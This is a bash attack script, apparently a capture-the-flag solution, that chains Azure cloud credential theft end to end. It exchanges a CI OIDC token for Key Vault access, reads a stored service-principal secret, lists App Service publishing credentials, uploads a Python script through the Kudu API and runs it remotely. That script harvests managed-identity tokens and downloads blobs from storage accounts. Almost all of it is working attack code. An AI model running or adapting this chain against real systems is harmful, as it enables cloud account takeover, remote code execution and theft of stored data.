#!/usr/bin/env bash
set +e
echo "=====PWN13_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d grant_type=client_credentials --data-urlencode "scope=https://vault.azure.net/.default" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "kudu=${PU:-FAIL}"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
cat > /tmp/z3.py <<'ZPY'
import os,json,urllib.request,urllib.error,urllib.parse
CID="7a85156a-01c4-4e61-8472-40a92107159b"
IH=os.environ.get("IDENTITY_HEADER") or "40dcfecb-3b2f-7086-721d-670bc5dafdf8"
IES=["http://169.254.131.2:8081/msi/token","http://169.254.131.5:8081/msi/token"]
ie=os.environ.get("IDENTITY_ENDPOINT") or ""
if ie: IES.insert(0,ie)
ST=""
for ep in IES:
    for res in ["https://storage.azure.com/.default","https://storage.azure.com"]:
        try:
            q=urllib.parse.urlencode({"api-version":"2019-08-01","resource":res,"client_id":CID})
            req=urllib.request.Request(ep+"?"+q,headers={"X-IDENTITY-HEADER":IH})
            with urllib.request.urlopen(req,timeout=15) as r:
                ST=json.loads(r.read()).get("access_token","")
            if ST:
                print("TOKEN_OK",ep,res[:40],"len",len(ST)); break
        except Exception as e:
            print("tok_err",ep,str(e)[:80])
    if ST: break
if not ST:
    print("NO_STORAGE_TOKEN"); raise SystemExit
def get(url):
    req=urllib.request.Request(url,headers={"Authorization":"Bearer "+ST,"x-ms-version":"2021-08-06"})
    try:
        with urllib.request.urlopen(req,timeout=25) as r: return r.status,r.read()
    except urllib.error.HTTPError as e: return e.code,e.read()
    except Exception as e: return None,str(e).encode()
for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
    for cont in ["config","internal","app-config","data","exports"]:
        c,b=get(f"https://{sa}.blob.core.windows.net/{cont}?restype=container&comp=list")
        print(f"LIST {sa}/{cont} -> {c}", b[:300].decode('utf8','replace').replace(chr(65279),'') if c!=200 else "")
        if c==200:
            import re
            for name in re.findall(rb'<Name>([^<]+)</Name>',b): print("  BLOBNAME:",name.decode())
        for blob in ["internal-config.json","config.json"]:
            c2,b2=get(f"https://{sa}.blob.core.windows.net/{cont}/{blob}")
            if c2==200:
                print(f"===== HIT {sa}/{cont}/{blob} =====")
                print(b2.decode('utf8','replace')[:3000])
            else:
                print(f"GET {sa}/{cont}/{blob} -> {c2} {b2[:120].decode('utf8','replace')}")
print("DONE13")
ZPY
curl -sS -m 30 -u "$PU:$PP" -X PUT "$SCM/api/vfs/site/wwwroot/z3.py" --data-binary @/tmp/z3.py -o /dev/null -w "vfs=%{http_code}\n"
OUT=$(curl -sS -m 150 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d '{"command":"python3 z3.py","dir":"/home/site/wwwroot"}')
echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or d.get("Error") or "")[:9000])' 2>/dev/null
echo "$OUT" | grep -o 'DF26{[^}]*}' | head -1
echo "=====PWN13_END====="